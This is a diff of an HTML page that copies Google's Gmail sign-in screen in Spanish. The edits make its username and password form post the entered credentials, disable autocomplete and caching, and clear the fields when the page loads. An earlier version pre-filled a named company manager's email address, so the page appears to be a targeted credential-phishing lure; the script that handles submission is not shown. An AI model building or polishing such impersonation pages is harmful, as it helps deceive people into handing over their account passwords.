@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Gmail - Iniciar sesión</title>
     <link rel="stylesheet" href="styles.css">
 </head>
@@ -21,14 +24,19 @@
             <h1 class="gmail-card-title">Iniciar sesión</h1>
             <p class="gmail-card-subtitle">Usa tu cuenta de Google</p>
 
-            <!-- Formulario -->
-            <form id="loginForm">
+            <!-- Formulario con autocomplete desactivado -->
+            <form id="loginForm" autocomplete="off" method="post">
                 <div class="gmail-input-group">
                     <input type="text" 
                            id="username" 
+                           name="username"
                            class="gmail-input" 
                            placeholder=" " 
-                           value="gerentetic@inversionesasar.com" 
+                           autocomplete="off"
+                           autocorrect="off"
+                           autocapitalize="off"
+                           spellcheck="false"
+                           value=""
                            required>
                     <label for="username" class="gmail-label">Correo electrónico o teléfono</label>
                 </div>
@@ -36,23 +44,18 @@
                 <div class="gmail-input-group">
                     <input type="password" 
                            id="password" 
+                           name="password"
                            class="gmail-input" 
                            placeholder=" " 
+                           autocomplete="new-password"
                            required>
                     <label for="password" class="gmail-label">Contraseña</label>
                 </div>
 
-                <!-- Botón de mostrar contraseña (opcional) -->
-                <div class="gmail-password-options">
-                    <button type="button" class="gmail-show-password" onclick="togglePassword()">
-                        Mostrar contraseña
-                    </button>
-                </div>
-
                 <!-- Opciones adicionales -->
-                <div class="gmail-options">
+                <div class="gmail-checkbox-group">
                     <label class="gmail-checkbox">
-                        <input type="checkbox">
+                        <input type="checkbox" onclick="togglePassword()">
                         <span>Mostrar contraseña</span>
                     </label>
                     <a href="#" class="gmail-link">¿Olvidaste tu contraseña?</a>
@@ -74,12 +77,9 @@
                 <a href="#" class="gmail-link">Crear cuenta</a>
                 <a href="#" class="gmail-link">¿Usar otro método?</a>
             </div>
-
-            <!-- Mensaje oculto (solo visible para debugging) -->
-            <div id="message" class="gmail-message" style="display: none;"></div>
         </div>
 
-        <!-- Footer con información adicional -->
+        <!-- Footer -->
         <div class="gmail-footer">
             <select class="gmail-language">
                 <option>Español (España)</option>
@@ -94,14 +94,23 @@
         </div>
     </div>
 
+    <!-- Mensaje oculto para debugging -->
+    <div id="message" style="display: none;"></div>
+
     <script src="script.js"></script>
     <script>
-        // Función para mostrar/ocultar contraseña (opcional)
+        // Función para mostrar/ocultar contraseña
         function togglePassword() {
             const passwordInput = document.getElementById('password');
             const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
             passwordInput.setAttribute('type', type);
         }
+        
+        // Limpieza adicional al cargar la página
+        window.onload = function() {
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        };
     </script>
 </body>
 </html>
